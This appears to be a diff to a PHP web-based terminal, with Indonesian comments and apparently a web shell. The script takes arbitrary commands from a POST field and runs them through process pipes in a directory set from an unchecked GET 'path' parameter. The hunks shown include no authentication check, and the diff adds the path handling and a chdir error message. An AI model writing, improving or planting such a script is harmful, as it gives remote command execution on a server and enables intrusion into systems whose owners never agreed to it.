@@ -2,6 +2,8 @@
 session_start();
 session_regenerate_id(true);
 
+$dir = isset($_GET['path']) ? realpath($_GET['path']) : __DIR__;
+
 // Tambahkan timeout
 if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 1800)) {
     session_unset();
@@ -73,7 +75,9 @@ function executeCommand($input, $workingDir) {
     }
 
     // Ubah direktori kerja
-    chdir($workingDir);
+    if (!chdir($workingDir)) {
+        return "Gagal mengubah direktori ke: $workingDir";
+    }
 
     $descriptors = array(
         0 => array("pipe", "r"),
@@ -108,7 +112,6 @@ function executeCommand($input, $workingDir) {
     }
 }
 
-// Dan perbaiki bagian untuk menangani output terminal
 if (isset($_POST['command'])) {
     $command = $_POST['command'];
     $output = executeCommand($command, $dir); // Pass the current directory
